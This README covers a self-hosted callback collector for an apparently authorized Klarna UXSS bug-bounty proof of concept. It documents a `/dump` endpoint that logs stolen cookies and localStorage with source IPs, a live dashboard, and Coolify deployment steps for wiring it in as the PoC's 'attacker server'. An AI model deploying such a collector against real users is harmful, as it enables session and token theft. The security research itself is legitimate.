# PoC Collector

A self-hosted out-of-band (OOB) callback listener for the authorized Klarna
UXSS PoC (HackerOne H1). It plays the same role as the `oast.fun` /
Interactsh endpoint the PoC uses today — but on infrastructure you control, so
the verification data from your own test account lands somewhere you can read
in real time instead of a shared interaction server.

The PoC fires this on success:

```
GET https://<your-domain>/dump?c=<cookies JSON>&l=<localStorage JSON>
```

The collector decodes `c` and `l`, appends one timestamped block to a flat
`.txt` file, and pushes it live to any open dashboard.

## Endpoints

| Route         | Method   | Purpose                                                             |
| ------------- | -------- | ------------------------------------------------------------------- |
| `/dump`       | GET/POST | Collector the PoC calls. Takes `?c=`/`?l=` or a JSON/form body. Open (no auth). |
| `/stream`     | GET      | Live HTML dashboard: full history + realtime cards, with timestamps. |
| `/stream/sse` | GET      | Server-Sent Events feed the dashboard subscribes to.                |
| `/raw`        | GET      | The plain `captures.txt`, exactly as stored.                        |
| `/health`     | GET      | Returns `ok` — use as the Coolify health check.                     |

Data is stored at `$DATA_DIR/captures.txt` (default `./data/captures.txt`),
one human-readable block per callback with ISO timestamp, source IP, method,
URL, user-agent, and the decoded cookies / localStorage.

## Configuration (environment variables)

| Var          | Default         | Notes                                                        |
| ------------ | --------------- | ------------------------------------------------------------ |
| `PORT`       | `3000`          | Port the server listens on. Coolify may set this for you.    |
| `DATA_DIR`   | `./data`        | Directory for `captures.txt`. Point at your mounted volume.  |
| `BASIC_AUTH` | *(unset)*       | Set `user:pass` to password-protect the **viewer** endpoints (`/stream`, `/stream/sse`, `/raw`). `/dump` always stays open so the PoC can reach it. |

## Run locally

```bash
cd poc/collector
node server.js                       # http://localhost:3000/stream
# fire a test callback:
curl "http://localhost:3000/dump?c=%5B%5D&l=%7B%22access_token%22%3A%22demo%22%7D"
```

No `npm install` — the server uses only Node built-ins.

---

## Deploy to Coolify

Coolify is a self-hosted PaaS; it builds your app and puts it behind its
bundled Traefik proxy with automatic Let's Encrypt HTTPS. Two ways to get this
folder onto it — **Git-based (recommended)** or **Docker Compose paste**.

### Prerequisites

- A Coolify server reachable on the internet (so the Klarna in-app browser can
  POST back to it) with ports 80/443 open.
- A domain or subdomain you can point at that server, e.g.
  `collector.example.com` → an `A` record to the server IP. (Coolify can also
  hand you a free `*.sslip.io` hostname if you don't want to use your own DNS.)

### Option A — deploy from a Git repo (recommended)

1. **Push this folder to a Git repo.** It can be its own repo, or a subfolder
   of a larger one (you'll set the base directory in step 4).

2. In Coolify: open (or create) a **Project** → pick the **production**
   environment → **+ New** → **Resource**.

3. Choose your source:
   - **Public Repository** — paste the repo URL, or
   - **Private Repository (GitHub App)** — connect GitHub first, then pick the repo.

4. Configure the build:
   - **Branch:** `main` (or wherever you pushed).
   - **Build Pack:** `Dockerfile`. Coolify will use the `Dockerfile` here.
     *(Nixpacks also works — it auto-detects Node from `package.json` and runs
     `npm start` — but the Dockerfile keeps `DATA_DIR=/data` explicit.)*
   - **Base Directory:** `/poc/collector` if the repo root is your bug-bounty
     repo, or `/` if this folder is its own repo.

5. **Port:** set **Ports Exposes** to `3000`. Traefik routes your domain to
   this container port.

6. **Domain:** Configuration → **Domains** → enter
   `https://collector.example.com`. Coolify provisions the TLS certificate
   automatically. This becomes your `/dump` host.

7. **Persistent storage (important).** Configuration → **Storages** → **Add** a
   volume mount so the log survives redeploys:
   - **Name:** `poc-collector-data`
   - **Destination Path:** `/data`

8. **Environment variables.** Configuration → **Environment Variables**:
   ```
   DATA_DIR=/data
   PORT=3000
   BASIC_AUTH=admin:pick-a-strong-password   # optional but recommended
   ```

9. **Health check (optional).** Point it at `/health` if Coolify asks for a
   path.

10. **Deploy.** Hit **Deploy** and watch the build logs. When it's green, open
    `https://collector.example.com/stream` — you should see the empty live
    dashboard.

### Option B — Docker Compose (paste, no Git)

Coolify → **+ New** → **Docker Compose**, then paste:

```yaml
services:
  collector:
    build: .
    environment:
      - PORT=3000
      - DATA_DIR=/data
      # - BASIC_AUTH=admin:pick-a-strong-password
    volumes:
      - poc-collector-data:/data
    ports:
      - "3000"
volumes:
  poc-collector-data:
```

Then set the domain as in Option A, step 6. (This still needs the source files
available to Coolify, so the Git flow is usually smoother.)

---

## Point the PoC at your collector

Once deployed, use `https://collector.example.com` as the attacker-server
value. Either:

- **Type it** into the `attacker server` input box in the PoC and click *Run*, or
- **Hardcode it** so there's no input step — in the PoC's HTML change the input
  default:
  ```html
  <input id="exfil" style="width:38ch" value="https://collector.example.com">
  ```

The PoC already builds `…/dump?c=…&l=…` and does a top-level navigation to it,
so no other change is needed.

## Read what came in

- **Live:** open `https://collector.example.com/stream` while you run the PoC.
- **Plain log:** `https://collector.example.com/raw`.
- **On the box:** in Coolify open the container **Terminal** and
  `cat /data/captures.txt`.

## Scope & hygiene

This is engagement infrastructure for the authorized Klarna program only:

- Only fire the PoC against **your own test account** — capture your own
  session, never a real user's.
- Keep the collector **private**: set `BASIC_AUTH`, and don't share the domain.
- **Tear it down** once the report is filed — delete the Coolify resource and
  its volume so no captured material lingers.
- Reference the collector URL and a `/raw` excerpt in the H1 report as proof
  the payload executed and data was reachable cross-origin.
